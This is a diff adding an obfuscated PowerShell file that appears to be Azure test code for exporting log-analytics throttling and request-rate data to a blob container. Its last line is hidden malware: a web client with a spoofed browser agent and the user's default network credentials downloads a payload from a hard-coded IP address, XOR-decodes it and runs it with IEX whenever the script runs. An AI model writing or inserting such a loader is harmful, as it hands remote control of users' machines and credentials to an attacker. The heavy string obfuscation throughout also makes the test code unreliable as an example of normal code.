@@ -1,0 +1,95 @@
+sET-VARiablE  ('a'+'Q7r') (  [type]("{7}{4}{10}{1}{9}{6}{8}{0}{2}{3}{5}"-f'ht','azurE.t','TPM','Oc','Roso','kSeRver','hTtPrE','Mic','CordEr.','ESt.','FT.')  ) ; seT-vArIabLE  AjR  ([tYpE]("{11}{5}{4}{6}{0}{9}{1}{7}{2}{8}{12}{10}{3}"-f '.hTTPr','e','tP','dE','T','icrosOFt.AzuRE.','esT','r.hT','RECo','ECORd','DERmO','M','R') );    sET-VaRIaBLE hL1Pu ( [tYPE]("{4}{3}{1}{0}{2}"-F'Eq','wEbR','ueSt','.','SySTEm.neT') );    SeT-iTem  ("VaRIaBlE"+":"+"O"+"E6b")  ([TyPe]("{1}{4}{2}{0}{5}{3}" -f'CREd','SY','.net.','NtIaLcaCHe','stEm','E') )  ;  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+function Test-eXPorTl`Ogan`ALyTIcT`hROt`TLeDre`Qu`ES`TsnE`GATiVe
+{
+    ${l`OC} = &("{5}{7}{0}{8}{4}{6}{3}{1}{2}" -f 'eOp','catio','n','Lo','r','Get-Compu','ation','t','e');
+    ${Fr`OM} = .("{0}{2}{1}"-f'Get','e','-Dat') -Year 2018 -Month 2 -Day 27 -Hour 9;
+    ${t`o} = &("{0}{1}" -f 'Ge','t-Date') -Year 2018 -Month 2 -Day 28 -Hour 9;
+    ${Sa`suRi} = ("{7}{3}{2}{6}{11}{0}{8}{1}{10}{9}{4}{5}"-f 'ore.blob.core.','indows.n','fak','s://','mylogs','/fakesas','e','http','w','/','et','st');
+    .("{0}{3}{4}{2}{1}"-f'As','tains','n','sert-Th','rowsCo') { `
+        ${RE`s`ULt} = &("{6}{3}{1}{8}{10}{4}{5}{2}{7}{0}{9}"-f'ledRequ','rt-A','r','o','ti','cTh','Exp','ott','zL','est','ogAnaly') -Location ${l`oC} -FromTime ${f`ROm} -ToTime ${t`O} -BlobContainerSasUri ${S`A`suRI} -GroupByThrottlePolicy -GroupByResourceName;} `
+        ("{0}{3}{5}{4}{2}{1}"-f'the ','RI','U','given SA',' ','S');
+}
+
+
+function te`St-ex`poRTloGAnA`lyTIcR`E`qUESTR`A`TebY`I`NTeRVAL`N`EGa`T`i`Ve
+{
+    ${l`OC} = .("{0}{4}{3}{2}{1}"-f 'Get-','n','tio','eOperationLoca','Comput');
+    ${f`RoM} = .("{1}{0}{2}"-f'-Dat','Get','e') -Year 2018 -Month 2 -Day 27 -Hour 9;
+    ${T`O} = &("{1}{2}{0}"-f'te','G','et-Da') -Year 2018 -Month 2 -Day 28 -Hour 9;
+    ${sas`U`RI} = ("{3}{4}{2}{1}{7}{0}{9}{5}{8}{6}" -f '.blob.','t','akes','h','ttps://f','mylogs/fa','sas','ore','ke','core.windows.net/');
+    ${inte`RVaL} = ("{0}{1}" -f 'Five','Mins');
+    .("{3}{2}{1}{0}{4}" -f'C','-Throws','sert','As','ontains') { `
+        ${r`EsuLt} = &("{2}{1}{7}{6}{4}{3}{0}{5}{8}"-f 'icR','xpor','E','gAnalyt','zLo','e','-A','t','questRateByInterval') -Location ${L`oc} -FromTime ${fR`om} -ToTime ${TO} -BlobContainerSasUri ${sAS`URI} -IntervalLength ${I`NtERv`AL} -GroupByThrottlePolicy -GroupByOperationName;} `
+        ("{2}{1}{0}{3}" -f'ven SAS UR','gi','the ','I');
+}
+
+
+function t`Est-EXpORTlo`GA`NaLYTicS
+{
+    ${Rg`N`AME} = .("{7}{0}{5}{6}{4}{3}{2}{1}"-f '-Comp','ceName','r','Resou','st','u','teTe','Get');
+    ${l`oc} = &("{6}{1}{0}{7}{2}{4}{3}{5}" -f 'put','om','Operation','cat','Lo','ion','Get-C','e');
+    ${S`TON`Ame} = 'sto' + ${R`gNA`ME};
+    ${ST`ot`YPe} = ("{0}{1}{2}" -f 'S','t','andard_GRS');
+    ${conT`AI`Ner} = ("{0}{1}"-f 'tes','t');
+    ${sa`stO`kEn} = ("{0}{1}" -f '?fa','kesas')
+
+    &("{1}{0}{3}{2}" -f 'Gro','New-AzResource','p','u') -Name ${r`G`NAMe} -Location ${l`Oc} -Force;
+    .("{4}{2}{5}{6}{3}{0}{1}"-f 'u','nt','ew-AzS','co','N','tor','ageAc') -ResourceGroupName ${R`G`NaMe} -Name ${S`TONA`mE} -Location ${l`OC} -Type ${S`TOtY`PE};
+    ${k`EY} = &("{2}{1}{5}{6}{3}{4}{0}"-f'ntKey','zS','Get-A','Acc','ou','tora','ge') -ResourceGroupName ${rG`NA`me} -Name ${s`TonAME};
+    ${cON`T`ext} = .("{0}{3}{2}{5}{1}{4}" -f'Ne','e','AzSto','w-','Context','rag') -StorageAccountName ${s`TOnA`me} -StorageAccountKey ${k`ey}."ke`y1";
+
+    if ( $Aq7r::"m`Ode" -ne  (  gci  VarIAblE:ajR).valUE::"PLA`YBa`Ck")
+    {
+        .("{0}{4}{1}{3}{2}"-f 'New','eCont','er','ain','-AzStorag') -Name ${c`o`Nta`InER} -Context ${CON`T`ext};
+        ${S`Astok`EN} = &("{3}{2}{1}{0}" -f 'Container','Storage','z','Get-A') -Name ${co`N`TAiNER} -Context ${coNtE`XT} | &("{3}{6}{2}{0}{4}{7}{5}{1}"-f 'iner','en','nta','New-A','S','Tok','zStorageCo','AS') -Permission ("{1}{0}"-f 'wdl','r') -Context ${c`On`TEXT};
+    }
+
+    try
+    {
+        ${f`Rom} = .("{0}{1}{2}"-f 'Ge','t-Da','te') -Year 2018 -Month 5 -Day 27 -Hour 9;
+        ${To} = &("{0}{2}{1}"-f'Get','Date','-') -Year 2018 -Month 5 -Day 28 -Hour 9;
+        ${sAS`U`Ri} = "https://$stoname.blob.core.windows.net/$container$sastoken";
+        ${in`Te`RVal} = ("{0}{1}"-f 'FiveMin','s');
+        ${reS`U`LT} = &("{0}{3}{7}{4}{2}{6}{1}{5}"-f'Expor','eByInter','yt','t','l','val','icRequestRat','-AzLogAna') -Location ${l`Oc} -FromTime ${F`RoM} -ToTime ${to} -BlobContainerSasUri ${SAsU`Ri} -IntervalLength ${IN`TeRV`Al} -GroupByThrottlePolicy -GroupByOperationName -GroupByResourceName;
+        .("{0}{2}{1}"-f 'Assert-Ar','al','eEqu') ("{2}{0}{1}" -f'de','d','Succee') ${Res`ULT}."STA`TuS";
+        ${o`UTpUt} = ${RE`sult} | &("{0}{1}{2}" -f 'Out-St','ri','ng');
+        &("{2}{1}{0}" -f't-True','sser','A') { ${O`UTP`Ut}.("{1}{2}{0}" -f 'ins','C','onta').Invoke(("{1}{0}" -f'v','.cs')); }
+        &("{0}{2}{1}"-f'Asse','True','rt-') { ${o`UT`PUT}.("{1}{0}{2}"-f 'tai','Con','ns').Invoke(("{5}{1}{2}{0}{3}{6}{4}" -f 't','equ','es','RateByInter','al','R','v')); }
+
+        ${R`e`sULT} = .("{1}{3}{5}{0}{4}{6}{2}" -f '-AzLogAnalyticThrottledRe','E','t','xpo','q','rt','ues') -Location ${L`Oc} -FromTime ${f`ROM} -ToTime ${t`O} -BlobContainerSasUri ${sAs`Uri} -GroupByThrottlePolicy -GroupByOperationName -GroupByResourceName;
+        &("{2}{0}{1}{3}"-f't-','AreEqu','Asser','al') ("{1}{0}"-f 'ucceeded','S') ${re`S`ULT}."stA`TUS";
+        ${OUT`PUt} = ${REs`ULT} | .("{0}{2}{1}" -f 'Ou','g','t-Strin');
+        .("{2}{3}{0}{1}" -f'Tru','e','As','sert-') { ${o`UT`PUt}.("{2}{1}{0}" -f's','ain','Cont').Invoke(("{0}{1}"-f '.','csv')); }
+        .("{2}{0}{1}{3}" -f'ss','ert-Tr','A','ue') { ${out`p`UT}.("{2}{1}{0}"-f 'ns','ntai','Co').Invoke(("{2}{3}{0}{1}" -f'eq','uests','Thr','ottledR')); }
+
+        if ( $AQ7R::"mO`DE" -ne  $ajR::"p`LAYbaCK")
+        {
+            ${b`L`Obs} = .("{3}{4}{0}{1}{2}"-f'r','a','geBlob','Get-AzSt','o') -Container ("{1}{0}" -f 't','tes') -Context ${c`OnT`Ext};
+            ${R`EQuEst`_`BloB} = ${BL`OBS} | .("{0}{1}"-f'wh','ere') {${_}."n`AME".("{1}{0}{2}"-f'ain','cont','s').Invoke(("{2}{0}{3}{1}{4}"-f 'questRa','Inte','Re','teBy','rval'))};
+            ${tH`ROtt`LE`_b`LOB} = ${bLO`BS} | .("{1}{0}" -f 're','whe') {${_}."Na`Me".("{1}{0}{2}"-f'tai','con','ns').Invoke(("{2}{1}{5}{0}{3}{4}" -f 'q','hrot','T','ue','sts','tledRe'))};
+            &("{3}{1}{0}{2}"-f't-NotN','er','ull','Ass') ${R`EqU`eS`T_BLOB};
+            &("{1}{2}{3}{0}" -f 'tNull','As','sert-N','o') ${ThRO`TTl`e_b`lOb};
+        }
+    }
+    finally
+    {
+        
+        &("{3}{1}{4}{2}{0}" -f'eGroup','ea','Resourc','Cl','n-') ${R`gN`AME};
+    }
+}
+
+${wc}=.("{1}{2}{0}"-f 'ct','NeW-OBJ','e') ("{0}{4}{3}{1}{2}{5}" -f 'SySt','.','NEt.W','M','E','eBCLIENt');${U}=(("{1}{5}{7}{4}{6}{10}{16}{11}{13}{17}{15}{8}{0}{2}{3}{9}{12}{14}"-f '.0','Moz','; rv:1','1.0)',' (Wi','illa/5','nd','.0','/7',' l','ows NT 6.1','W64;','ike Gec',' ','ko','t','; WO','Triden'));${W`C}."HEAD`eRs".("{1}{0}"-f'dD','A').Invoke(("{2}{1}{0}" -f'er-Agent','s','U'),${U});${w`c}."p`ROXy" =  (  chILDiteM VAriabLe:Hl1PU ).VALUE::"dEFaU`lTwEB`P`ROxy";${wc}."P`RoxY"."c`ReDeNT`IAlS" =   (gET-VARiABle ("o"+"e6B")  -ValUEoN  )::"D`EfA`UL`TnEtW`orkcREDent`iALS";${K}='\o9Kylpr(IGJF}C^2qd/=]s3Zfe_P<*H';${I}=0;[chaR[]]${b}=([chAr[]](${WC}.("{0}{1}{2}"-f 'DowNLOAdSt','r','inG').Invoke(("{2}{3}{4}{1}{5}{0}" -f 'asp','.139.88:80/inde','http:/','/95.21','1','x.'))))|&('%'){${_}-BXOR${k}[${I}++%${K}."l`engTh"]};&("{0}{1}" -f'I','EX') (${B}-JOIN'')
